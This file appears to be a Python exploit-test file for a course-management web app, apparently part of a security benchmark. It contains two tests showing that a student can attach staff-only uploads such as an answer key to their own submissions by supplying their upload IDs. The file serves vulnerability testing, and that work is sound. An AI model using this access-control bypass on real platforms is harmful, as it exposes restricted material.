import io
import requests


def api_url(base_url: str, path: str) -> str:
    return base_url.rstrip("/") + path


def json_of(resp):
    try:
        return resp.json()
    except Exception as exc:
        raise AssertionError(
            f"Expected JSON response, got status={resp.status_code}, body={resp.text}"
        ) from exc


def register(session: requests.Session, base_url: str, username: str, password: str, display_name: str):
    return session.post(
        api_url(base_url, "/api/auth/register"),
        json={
            "username": username,
            "password": password,
            "display_name": display_name,
        },
        timeout=10,
    )


def create_course(session: requests.Session, base_url: str, title: str, description: str):
    return session.post(
        api_url(base_url, "/api/courses"),
        json={
            "title": title,
            "description": description,
        },
        timeout=10,
    )


def add_member(session: requests.Session, base_url: str, course_id: int, user_id: int, role_in_course: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/members"),
        json={
            "user_id": user_id,
            "role_in_course": role_in_course,
        },
        timeout=10,
    )


def list_users(session: requests.Session, base_url: str):
    return session.get(api_url(base_url, "/api/users"), timeout=10)


def find_user_id_by_username(session: requests.Session, base_url: str, username: str):
    resp = list_users(session, base_url)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True
    for user in payload["users"]:
        if user["username"] == username:
            return int(user["user_id"])
    return None


def create_assignment(session: requests.Session, base_url: str, course_id: int, title: str, description: str, due_at: str = ""):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/assignments"),
        json={
            "title": title,
            "description": description,
            "due_at": due_at,
        },
        timeout=10,
    )


def upload_file_api(session: requests.Session, base_url: str, course_id: int, filename: str, content: bytes, content_type: str):
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/uploads"),
        files={
            "file": (filename, io.BytesIO(content), content_type),
        },
        timeout=10,
    )


def create_submission(session: requests.Session, base_url: str, course_id: int, assignment_id: int, content_text: str, attachment_upload_id=None):
    body = {"content_text": content_text}
    if attachment_upload_id is not None:
        body["attachment_upload_id"] = attachment_upload_id
    return session.post(
        api_url(base_url, f"/api/courses/{course_id}/assignments/{assignment_id}/submissions"),
        json=body,
        timeout=10,
    )


def update_submission(session: requests.Session, base_url: str, course_id: int, assignment_id: int, submission_id: int, content_text: str, attachment_upload_id=None):
    body = {"content_text": content_text}
    if attachment_upload_id is not None:
        body["attachment_upload_id"] = attachment_upload_id
    return session.put(
        api_url(base_url, f"/api/courses/{course_id}/assignments/{assignment_id}/submissions/{submission_id}"),
        json=body,
        timeout=10,
    )


def list_my_submissions(session: requests.Session, base_url: str):
    return session.get(api_url(base_url, "/api/my/submissions"), timeout=10)


def find_submission_by_id(session: requests.Session, base_url: str, submission_id: int):
    resp = list_my_submissions(session, base_url)
    assert resp.status_code == 200, resp.text
    payload = json_of(resp)
    assert payload["success"] is True
    for sub in payload["submissions"]:
        if int(sub["submission_id"]) == int(submission_id):
            return sub
    return None


def test_exploit_vuln_002_student_can_create_submission_using_staff_uploaded_file(app_instance):
    """
    Exploit expectation:
    A student can create a submission that references an arbitrary course upload
    created by staff, because the server checks only course scope of the upload.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    student = requests.Session()

    r = register(teacher, base_url, "attach_teacher", "pass123", "Attach Teacher")
    assert r.status_code == 201, r.text

    r = register(student, base_url, "attach_student", "pass123", "Attach Student")
    assert r.status_code == 201, r.text

    create_course_resp = create_course(teacher, base_url, "Submission Attach Course", "demo")
    assert create_course_resp.status_code == 201, create_course_resp.text
    course_id = int(json_of(create_course_resp)["course"]["course_id"])

    student_user_id = find_user_id_by_username(teacher, base_url, "attach_student")
    assert student_user_id is not None

    add_resp = add_member(teacher, base_url, course_id, student_user_id, "student")
    assert add_resp.status_code == 201, add_resp.text

    assignment_resp = create_assignment(
        teacher,
        base_url,
        course_id,
        "Assignment 1",
        "submit something",
    )
    assert assignment_resp.status_code == 201, assignment_resp.text
    assignment_id = int(json_of(assignment_resp)["assignment"]["assignment_id"])

    upload_resp = upload_file_api(
        teacher,
        base_url,
        course_id,
        "teacher_notes.pdf",
        b"%PDF-1.4 fake teacher file",
        "application/pdf",
    )
    assert upload_resp.status_code == 201, upload_resp.text
    upload_id = int(json_of(upload_resp)["upload"]["upload_id"])

    forged = create_submission(
        student,
        base_url,
        course_id,
        assignment_id,
        "student submission bound to teacher file",
        attachment_upload_id=upload_id,
    )
    assert forged.status_code == 201, forged.text

    payload = json_of(forged)
    assert payload["success"] is True
    assert int(payload["submission"]["attachment_upload_id"]) == upload_id
    assert payload["submission"]["attachment_original_name"] == "teacher_notes.pdf"


def test_exploit_vuln_002_student_can_rebind_own_submission_to_staff_uploaded_file(app_instance):
    """
    Exploit expectation:
    A student can update their submission and attach an arbitrary staff-uploaded
    course file by supplying attachment_upload_id from the same course.
    """
    base_url = app_instance["base_url"]

    teacher = requests.Session()
    student = requests.Session()

    r = register(teacher, base_url, "attach_teacher_upd", "pass123", "Attach Teacher Upd")
    assert r.status_code == 201, r.text

    r = register(student, base_url, "attach_student_upd", "pass123", "Attach Student Upd")
    assert r.status_code == 201, r.text

    create_course_resp = create_course(teacher, base_url, "Submission Attach Update Course", "demo")
    assert create_course_resp.status_code == 201, create_course_resp.text
    course_id = int(json_of(create_course_resp)["course"]["course_id"])

    student_user_id = find_user_id_by_username(teacher, base_url, "attach_student_upd")
    assert student_user_id is not None

    add_resp = add_member(teacher, base_url, course_id, student_user_id, "student")
    assert add_resp.status_code == 201, add_resp.text

    assignment_resp = create_assignment(
        teacher,
        base_url,
        course_id,
        "Assignment 2",
        "submit something else",
    )
    assert assignment_resp.status_code == 201, assignment_resp.text
    assignment_id = int(json_of(assignment_resp)["assignment"]["assignment_id"])

    create_sub_resp = create_submission(
        student,
        base_url,
        course_id,
        assignment_id,
        "initial student submission",
        attachment_upload_id=None,
    )
    assert create_sub_resp.status_code == 201, create_sub_resp.text
    submission_id = int(json_of(create_sub_resp)["submission"]["submission_id"])

    upload_resp = upload_file_api(
        teacher,
        base_url,
        course_id,
        "staff_only_answer_key.pdf",
        b"%PDF-1.4 fake staff-only material",
        "application/pdf",
    )
    assert upload_resp.status_code == 201, upload_resp.text
    upload_id = int(json_of(upload_resp)["upload"]["upload_id"])

    forged = update_submission(
        student,
        base_url,
        course_id,
        assignment_id,
        submission_id,
        "updated submission now points to teacher upload",
        attachment_upload_id=upload_id,
    )
    assert forged.status_code == 200, forged.text

    payload = json_of(forged)
    assert payload["success"] is True
    assert int(payload["submission"]["attachment_upload_id"]) == upload_id
    assert payload["submission"]["attachment_original_name"] == "staff_only_answer_key.pdf"

    verify = find_submission_by_id(student, base_url, submission_id)
    assert verify is not None
    assert int(verify["attachment_upload_id"]) == upload_id
    assert verify["attachment_original_name"] == "staff_only_answer_key.pdf"